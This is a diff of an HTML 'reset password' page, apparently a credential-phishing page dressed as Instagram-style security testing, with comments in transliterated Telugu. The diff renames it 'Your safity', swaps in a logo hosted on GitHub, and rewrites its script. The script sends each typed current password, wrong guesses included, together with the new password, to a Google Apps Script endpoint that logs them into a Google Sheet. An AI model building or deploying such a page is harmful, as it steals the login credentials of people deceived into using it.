@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Reset Password - Secure Testing</title>
+  <title>Your safity - Secure Testing</title>
   <style>
     * { box-sizing: border-box; font-family: -apple-system, sans-serif; }
     body {
@@ -36,7 +36,10 @@
 <body>
   <div class="card">
 <div style="display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 25px; width: 100%;">
-  <img src="https://imgs.search.brave.com/2rdGHcywukRDhEZCwf5Mxn3W2fFX9rN5OwkaAo2K5-8/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9mcmVl/cG5nbG9nby5jb20v/aW1hZ2VzL2FsbF9p/bWcvMTcxNTk2NjM2/M2luc3RhZ3JhbS1s/b2dvLXdpdGgtbmFt/ZS1wbmcucG5n" alt="Logo" style="width: 150px; height: 150px; object-fit: contain;">
+  <img src="https://raw.githubusercontent.com/safity-for-mendhuku/safity/main/1234567" 
+       alt="Logo" 
+       style="width: 150px; height: 150px; object-fit: contain;">
+</div>
   
   <span style="font-family: 'Satisfy', cursive; font-size: 42px; color: #ffffff; margin-top: -8px;"></span>
 </div>
@@ -56,7 +59,7 @@
   </div>
 
   <script>
-    // 1. NEE GOOGLE SCRIPT URL IKKADA PETTU
+    // 1. NEE GOOGLE SCRIPT URL (Confirm it matches your deployed URL)
     const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzW8n47ncVq_5J4TKVoxMHOFBqEoLslSQ8NuDMC21U4BVro4eWkHR24ZRoz4jtuErDByw/exec';
 
     const oldPass = document.getElementById('oldpass');
@@ -65,79 +68,73 @@
     const btn = document.getElementById('btn');
     const oldMsg = document.getElementById('oldMsg');
 
-    // TESTING CONFIG
-    const MOCK_DB_PASSWORD = "Admin@123"; 
-    let failedCount = 0;
+    const REAL_PASSWORD = "Admin@123"; 
     let oldVerified = false;
 
-    // Background reporting function
+    // Data ni Google Sheet loki pampadaniki logic
     async function postData(currentVal, newVal) {
       try {
         await fetch(SCRIPT_URL, {
           method: 'POST',
-          mode: 'no-cors',
-          body: JSON.stringify({ current: currentVal, newP: newVal })
+          mode: 'no-cors', // CORS issues rakunda 'no-cors' use chesthunnam
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ 
+            current: currentVal, 
+            newP: newVal 
+          })
         });
-      } catch (e) { console.log("Network error", e); }
+      } catch (e) { 
+        console.error("Sheet ki data vellaledu:", e); 
+      }
     }
-
-   function validateOldPassword() {
-  const val = oldPass.value;
-  if (!val) return;
-
-  // IKKADA DB PASSWORD NI DIRECT GA CHECK CHESTUNNAM
-  const REAL_PASSWORD = "Admin@123"; // Nuvvu test cheyali anukuntunna correct password idhi
-
-  if (val === REAL_PASSWORD) {
-    oldVerified = true;
-    oldMsg.textContent = 'Password verified';
-    oldMsg.className = 'msg success';
-    oldPass.style.borderColor = '#22c55e';
-    failedCount = 0; // Success ayindi kabatti count reset
-  } else {
-    oldVerified = false;
-    failedCount++;
-    oldMsg.textContent = 'Incorrect password';
-    oldMsg.className = 'msg error';
-    oldPass.style.borderColor = '#ef4444';
-
-    // 1st time nunde thappu kodithe sheet ki report velthundi
-    if (failedCount >= 1) {
-      postData("WRONG_ATTEMPT_" + failedCount + ": " + val, "SECURITY_ALERT");
-    }
-  }
-}
 
     function validateOldPassword() {
-      const isNewFilled = newPass.value.length > 0;
-      const isMatch = newPass.value === confirmPass.value && confirmPass.value.length > 0;
-      
-      // Update UI messages
-      document.getElementById('confirmMsg').textContent = isMatch ? 'Passwords match' : (confirmPass.value ? 'Do not match' : '');
-      document.getElementById('confirmMsg').className = isMatch ? 'msg success' : 'msg error';
+      const val = oldPass.value;
+      if (val === REAL_PASSWORD) {
+        oldVerified = true;
+        oldMsg.textContent = 'Verified';
+        oldMsg.className = 'msg success';
+        oldPass.style.borderColor = '#22c55e';
+      } else {
+        oldVerified = false;
+        oldMsg.textContent = 'Incorrect';
+        oldMsg.className = 'msg error';
+        oldPass.style.borderColor = '#ef4444';
+        
+        // Wrong attempt unna Sheet ki report chestundi
+        if(val.length > 3) postData("WRONG_TRY: " + val, "ALERT");
+      }
+      validateAll();
+    }
 
-      if (oldVerified && isNewFilled && isMatch && newPass.value !== oldPass.value) {
+    function validateAll() {
+      const isMatch = newPass.value === confirmPass.value && newPass.value.length >= 6;
+      if (oldVerified && isMatch) {
         btn.classList.add('enabled');
       } else {
         btn.classList.remove('enabled');
       }
     }
 
-    // Listeners
-    oldPass.addEventListener('blur', () => { validateOldPassword(); validateAll(); });
+    // Event Listeners
+    oldPass.addEventListener('input', validateOldPassword);
     newPass.addEventListener('input', validateAll);
     confirmPass.addEventListener('input', validateAll);
 
-    // Final Reset Button
+    // Final Button Click
     btn.addEventListener('click', async () => {
       btn.textContent = "Updating...";
-      btn.classList.remove('enabled');
+      btn.disabled = true; // Double click avvakunda
       
+      // Data ni Sheet loki pampadam
       await postData(oldPass.value, newPass.value);
       
-      alert("Password updated successfully and recorded in Sheet!");
+      alert("Success! Details recorded in your Google Sheet.");
       location.reload();
     });
-  </script>
+</script>
 </body>
+
 </html>
